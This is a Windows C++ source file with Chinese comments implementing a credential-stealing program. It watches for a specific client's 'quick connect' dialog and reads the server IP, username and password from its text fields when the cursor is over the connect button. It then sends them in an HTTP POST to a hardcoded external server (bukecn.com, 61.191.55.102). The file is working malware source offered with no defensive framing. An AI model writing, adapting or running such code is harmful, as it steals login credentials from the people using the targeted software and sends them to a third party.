// PostMessage.cpp : Defines the entry point for the application.
//

#include "stdafx.h"

#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
#include "http.h"


int SendPassWord(char *password)
{
	WSADATA wsaData;
    WORD sockVersion = MAKEWORD(2, 2);
	//加载winsock库
	if(WSAStartup(sockVersion, &wsaData) != 0)
		return 0;
	// 创建套节字
    SOCKET sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sClient == INVALID_SOCKET)
	{
		printf("socket error\n");
		return 0;
	}	
	// 在sockaddr_in结构中装入服务器端地址信息
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	//设置连接端口
	servAddr.sin_port = htons(80);
	//服务器端ip
	servAddr.sin_addr.S_un.S_addr =inet_addr("61.191.55.102");
	//连接服务器端
	if(connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr))==SOCKET_ERROR)
	{
		printf("connect error\n");
		closesocket(sClient);
		return 0;
	}
	char packet[1024];
	//提交的URL
	char *url="/bbs/Databackup/info.asp";
	//服务器域名
	char *host="bukecn.com";
	//构造POST数据包
	HttpPostPacket(packet,url,host,password);
    //发送数据
	send(sClient,packet,strlen(packet),0);
	char revData[1024]={0};
	//接受数据
	int ret=recv(sClient,revData,1024,0);
	//关闭套接字
	closesocket(sClient);
	WSACleanup();
	return 0;
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char PassWord[80]={0};
	char ServerIp[80]={0};
	char UserName[80]={0};
	char BackUserName[80]={0};
	//循环监控
	while(TRUE)
	{
		HWND hwnd;
		char ClassName[255];
		//得到当前活动窗口句柄
		hwnd=GetForegroundWindow();
		//得到当前活动窗口类名
		GetClassName(hwnd,ClassName,255);
		//判断是否是快速连接窗口
		if(strcmp(ClassName,"TfrmQuick")==0)
		{
			char ButtonName[80]={0};
			tagPOINT lpPoint;
			//得到鼠标当前坐标
			GetCursorPos(&lpPoint);
			//得到当前坐标所在窗体的句柄
			hwnd=WindowFromPoint(lpPoint);
			if(hwnd==NULL)
				continue;
			//发送WM_GETTEXT消息，得到窗体文本
			SendMessage(hwnd,WM_GETTEXT,80,(LPARAM)ButtonName);
			//假如文本内容为“连接”则说明鼠标光标在连接按钮上了
			if(strcmp(ButtonName,"连接")!=0)
				continue;
			hwnd=FindWindowEx(NULL,NULL,"TfrmQuick","快速连接");
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TPageControl",NULL);
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TTabSheet","常规");
			if(hwnd==NULL)
				continue;
			HWND hFirst=FindWindowEx(hwnd,NULL,"TEdit",NULL);
			if(hFirst==NULL)
				continue;
			//得到服务器IP
			SendMessage(hFirst,WM_GETTEXT,80,(LPARAM)ServerIp);
			HWND hNext=FindWindowEx(hwnd,hFirst,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//得到密码
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)PassWord);
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//得到用户名
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)UserName);
			//和上一次的记录的用户名比较，防止重复记录
			if(strcmp(BackUserName,UserName)==0)
				continue;
			//备份用户名
			strcpy(BackUserName,UserName);
			char Data[512]={0};
			//格式化数据
			wsprintf(Data,"msg=服务器IP：%s  用户名：%s  密码：%s\r\n",ServerIp,UserName,PassWord);
			//写入文件
			SendPassWord(Data);	
		}
		Sleep(500);
	}
	return 0;
}



